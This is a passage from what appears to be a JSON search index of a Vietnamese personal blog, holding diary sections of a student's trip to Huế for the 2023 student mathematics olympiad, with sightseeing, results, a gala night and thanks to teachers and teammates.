vị vua thời Nguyễn. Có rất nhiều thứ thú vị được cô hướng dẫn kể mà tôi quên gần hết. Đội Đại số ở Kinh thành Huế\" Đội Đại số ở Kinh thành Huế Đội Đại số ở cổng kinh thành\" Đội Đại số ở cổng kinh thành Thầy đang chuẩn bị chụp ảnh cho tôi Cô Lý - mẫu ảnh giỏi Toán nhất tôi từng gặp\" Cô Lý - mẫu ảnh giỏi Toán nhất tôi từng gặp Ngôi sao giải tích\" Ngôi sao giải tích Anh Minh gà tre\" Anh Minh gà tre Chị Thơm chân ngắn\" Chị Thơm chân ngắn Chị Lan Anh, mặc bộ này hơi bị xinh luôn\" Chị Lan Anh, mặc bộ này hơi bị xinh luôn Anh Hải Nam chủ tịch\" Anh Hải Nam chủ tịch Anh Huy - Người anh tôi mới quen sau chuyến đi Huế Tham quan xong kinh thành Huế, thầy cô cho chúng tôi đi chùa Thiên Mụ. Ở chùa có 1 phòng trưng bày xe ô tô của Hòa thượng Thích Quảng Đức khi đi ra ngã tư tự thiêu để phản đối sự đàn áp Phật giáo của chính quyền Ngô Đình Diệm. Chùa Thiên Mụ\" Chùa Thiên Mụ Tối về chúng tôi ăn cơm ở khách sạn rồi lên phòng chơi. Buổi đêm thầy về báo điểm cho chúng tôi. Chị Thơm được 13 điểm, chị Lan Anh 12.5, tôi 10.5, anh Nam 8.5, anh Kiên 4.5. Lúc đó tôi thấy anh Kiên rất buồn. Tôi cũng chỉ mong mình được giải khuyến khích thôi. Thầy về phòng, anh Phong, anh Phương chạy sang phòng tôi hỏi thăm kết quả. Ai nấy đều buồn, cuối cùng có tôi, anh Nam, chị Lan Anh sang phòng giải tích đánh bài ăn bánh kem. Tôi hơi đen khi được ăn mỗi một lần 😢 ","date":"2023-04-10","objectID":"/2023-olympic-mathematics/:4:0","tags":["Blog","Mathematics"],"title":"Olympic Toán Sinh viên 2023","uri":"/2023-olympic-mathematics/"},{"categories":null,"content":"Ngày thứ năm (07 - 04 - 2023) Sáng thứ 6, đoàn đi chơi ở lăng tẩm. Bọn tôi đi chơi hơi mệt, chụp được một đống ảnh. Hai đoàn Bắc - Nam\" Hai đoàn Bắc - Nam Anh Kiên đẹp trai nhất đội tuyển\" Anh Kiên đẹp trai nhất đội tuyển Anh Hạnh đang khấn để năm sau được vàng\" Anh Hạnh đang khấn để năm sau được vàng Chị Lan Anh mặc bộ này như tổng tài thế nhỉ\" Chị Lan Anh mặc bộ này như tổng tài thế nhỉ Chị Xê bên hồ cá\" Chị Xê bên hồ cá Cô Loan và cô Lan Anh\" Cô Loan và cô Lan Anh Cô Loan siêu dễ thương\" Cô Loan siêu dễ thương Anh Hụy chụp ảnh siêu đẹp\" Anh Hụy chụp ảnh siêu đẹp Anh Tân rất rất rất ngầu Trưa về thầy cô cho mỗi người 200.000 để mua quà Huế. Tôi không biết mua cái gì nên không mua. Trưa bọn tôi ăn cơm ở khách sạn, ăn xong thì thầy báo giải cho chúng tôi. Thầy báo đoàn Hà Nội môn Đại số có 3 giải, 2 nhì và 1 ba. Giải khuyến khích thì chưa có xét. Buổi tối bọn tôi và các đoàn trường khác ăn tiệc gala ở khách sạn Hương Giang. Đây là đêm vui nhất trong cuộc đời đi học của tôi, chúng tôi ăn uống thoải mái, nói chuyện vui vẻ. Hai đội tuyển trong đêm gala\" Hai đội tuyển trong đêm gala Anh Tân, anh Huy, Anh Kiên, Đạt, anh Nam, anh Trường\" Anh Tân, anh Huy, Anh Kiên, Đạt, anh Nam, anh Trường Bàn tôi chắc là nổi nhất cả hội trường đêm đó. Khi mọi người đang ăn uống thì chúng tôi bắt đầu 1.2.3 dô làm náo loạn cả hội trường😄. Anh Kiên, anh Nam, Đạt, anh Huy, anh Phong, anh Trường\" Anh Kiên, anh Nam, Đạt, anh Huy, anh Phong, anh Trường Đội tuyển Giải tích\" Đội tuyển Giải tích Chị Xê, anh Tân, anh Sơn, anh Bách, cô Loan, cô Lan Anh\" Chị Xê, anh Tân, anh Sơn, anh Bách, cô Loan, cô Lan Anh Bọn tôi có đăng ký hát bài “Hào khí Việt Nam”. Anh Kiên và anh Huy là ca sĩ, tôi tất nhiên là hoạt náo viên 😄 Hai đội tuyển trong đêm gala\" Hai đội tuyển trong đêm gala Có một bạn nữ đến từ Đại học Vinh hát bài “Tàu anh qua núi”. Hehe, được gặp đồng hương rồi. Tôi rất ấn tượng với giọng hát của em ấy. Tôi có gặp lại Hà, đang học Đại học Vinh. Hà thi môn giải tích, ngày xưa học cùng A01 với tôi, tôi không nhớ là lớp mấy nữa 😓 Xin lỗi bạn Hà nhiều nhé. Tối đêm đó tôi quẩy nhiệt quá, thầy cô cũng bất ngờ với tôi luôn 😜 Tôi mất luôn giọng, đến tận ngày hôm nay lúc đang viết bài này vân đang đau họng. Quẩy xong rồi, chúng tôi về rủ cô Loan đi ăn chè hẻm. Tôi thấy cũng khá bình thường, hơi ngọt một chút. Tối ngủ thì thầy báo anh Nam được giải khuyến khích. ","date":"2023-04-10","objectID":"/2023-olympic-mathematics/:5:0","tags":["Blog","Mathematics"],"title":"Olympic Toán Sinh viên 2023","uri":"/2023-olympic-mathematics/"},{"categories":null,"content":"Ngày thứ sáu (08 - 04 - 2023) Sáng thứ 7, cả đoàn ra trường ĐHSP Huế để bế mạc. Tôi kiếm Băng để chụp ảnh cùng mà Băng mải nói chuyện với bạn nên đi về trước. Hơi buồn 😥 Đội tuyển Hà Nội trong buổi bế mạc\" Đội tuyển Hà Nội trong buổi bế mạc Cô mệt rồi, chụp nhanh đi bây\" Cô mệt rồi, chụp nhanh đi bây Năm sau lấy vàng nhé\" Năm sau lấy vàng nhé Anh Phong và bạn MC người Nghệ An\" Anh Phong và bạn MC người Nghệ An Anh Thành đã mang về chiếc huy chương vàng đầu tiên về cho phân hiệu\" Anh Thành đã mang về chiếc huy chương vàng đầu tiên về cho phân hiệu Anh Trường với kiểu chụp khép nép\" Anh Trường với kiểu chụp khép nép Buổi trưa chúng tôi ăn cơm tại khách sạn rồi sắp xếp đồ để đi về. Chiều thứ 7, đoàn Hà Nội chúng tôi lên tàu để về. Ở trên tàu, tôi nằm ở tầng 3, gần cái điều hòa nên hơi lạnh. Buổi chiều, cô Lý mua cơm cho chúng tôi. Tôi ăn suất cơm gà. Tối chạy sang phòng giải tích đánh bài với em gái bên Đại học Xây dựng. ","date":"2023-04-10","objectID":"/2023-olympic-mathematics/:6:0","tags":["Blog","Mathematics"],"title":"Olympic Toán Sinh viên 2023","uri":"/2023-olympic-mathematics/"},{"categories":null,"content":"Ngày thứ bảy (09 - 04 - 2023) Sáng chủ nhật, tầm 5h sáng, đoàn chúng tôi về Hà Nội. Thầy cô thuê taxi cho chúng tôi về trường Đại học Thủy Lợi rồi đưa bọn tôi đi ăn bún phía sau sân tenis. Vậy là kết thúc hành trình 7 ngày đi thi Olympic. Lời đầu tiên, em xin gửi lời cảm ơn sâu sắc tới thầy Thọ - trưởng khoa bộ môn Toán đã tin tưởng và bồi dưỡng em trong quá trình ôn tập. Em xin cảm ơn thầy Đắc, một người thầy khá thú vị, tưởng khó gần nhưng thực ra rất gần gũi với sinh viên. Em đoán là thầy nghĩ em cần thêm 1 năm nữa mới nên cơm cháo, dù lần này được giải nhưng vẫn chưa cao. Em tin rằng năm sau em sẽ có được huy chương vàng. Em cảm ơn thầy Lân đã dạy em một chuyên đề “vàng”, nếu bọn em học kĩ càng phần của thầy thì chắc cả đội được “vàng” rồi. Em cảm ơn thầy Phong khi đã dạy bọn em tổ hợp, nhờ thầy mà em biết cách làm sao đánh Poker thắng anh Huy và rán bánh như thế nào thì mau chín. Em xin cảm ơn đến một người cô rất đặc biệt, đó là cô Lý. Dù cô không trực tiếp bồi dưỡng em nhưng cô là giảng viên trên lớp của em. Em cảm ơn cô vì sự quan tâm và sự gần gũi của cô dành cho bọn em. Khi ở bên cô, dường như bọn em không thấy khoảng cách vô hình giữa giáo viên và học sinh nữa. Một lần nữa, bọn em xin cảm ơn cô.\\ Em cảm ơn cô Loan, cô Lan Anh ở phân hiệu khi đã tạo cho chúng em những tiếng cười vui vẻ. Em sẽ không quên những người anh ở trong phân hiệu: Anh Huy (Phú Yên), anh Thành (Tiền Giang), anh Nguyên (Hồ Chí Minh), anh Trường, anh Sơn (Đak Lak), anh Tân (Bình Thuận), anh Bách (Quảng Bình), anh Phong (Bình Định) và anh Huy chụp ảnh bụng bự đã cho em những kỷ niệm khó quên. Em cảm ơn các anh bên đội giải tích: Anh Đức Phong, anh Đăng Phương (Quảng Ninh), anh Chu Kiên, anh Đình Hạnh (Nghệ An), anh Tuấn Minh (Hà Tĩnh). Cuối cùng, em xin cảm ơn các anh chị đội Đại số: anh Hải Nam, chị Lan Anh (Hải Dương) đã bắt chuyện với đứa em này những ngày đầu học đội tuyển. Em xin cảm ơn chị Thơm (Nam Định) đã nhiệt tình giúp đỡ em trong việc giải bài. Và cuối cùng là anh Kiên (Thanh Hóa), lúc đầu em thấy anh này không có gì đặc biệt, sau này mới phát hiện ra anh Kiên rất tốt bụng và nhiệt tình. Cảm ơn anh Kiên rất nhiều vì luôn quan tâm tới đứa em hiền lành, ít nói này 😁 Mãi yêu gia đình Olympic Toán. Hẹn gặp lại mọi người ở những năm Olympic sau. ","date":"2023-04-10","objectID":"/2023-olympic-mathematics/:7:0","tags":["Blog","Mathematics"],"title":"Olympic Toán Sinh viên 2023","uri":"/2023-olympic-mathematics/"}]